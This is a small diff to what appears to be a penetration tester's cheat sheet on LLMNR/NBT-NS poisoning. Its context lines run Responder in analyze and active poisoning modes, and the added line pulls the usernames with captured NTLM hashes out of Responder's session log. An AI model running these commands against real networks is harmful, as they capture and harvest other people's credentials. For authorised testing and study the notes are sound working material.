@@ -10,6 +10,7 @@ sudo responder -I eth0 -A ( Analyze Mode )
 sudo responder -I eth0 -dwv
 
 /usr/share/responder/logs/
+grep -i "NTLM" /usr/share/responder/logs/Responder-Session.log | awk -F'::' '{print $1}' | awk '{print $NF}' | sort -u
 
 WIRESHARK
 llmnr || nbns
